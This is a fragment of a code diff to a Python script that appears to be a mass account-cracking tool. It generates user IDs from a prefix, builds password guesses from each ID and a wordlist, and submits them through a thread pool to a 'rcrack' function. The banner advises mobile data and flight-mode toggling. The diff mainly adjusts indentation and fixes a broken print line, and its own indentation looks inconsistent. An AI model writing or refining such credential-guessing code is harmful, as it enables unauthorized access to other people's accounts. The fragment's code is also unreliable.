@@ -192,14 +192,14 @@ def xxr():
         jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
         jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode in 5 min for Speed Up')
         jalan('\033[1;92m••●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○●●●●●○○○○○••')
-        for love in user:
+     for love in user:
             pwx = [love[1:]]
             uid = code+love
             for Eman in HamiiID:
                 pwx.append(Eman)
                 pwx.append(love)
             manshera.submit(rcrack,uid,pwx,tl)
-    print(f"\n{x}     print(f"\n{x} ══════════════════════════════════════════")
+    print(f"\n{x} ══════════════════════════════════════════")
 def rcrack(uid,pwx,tl):
     #print(user)
     global loop
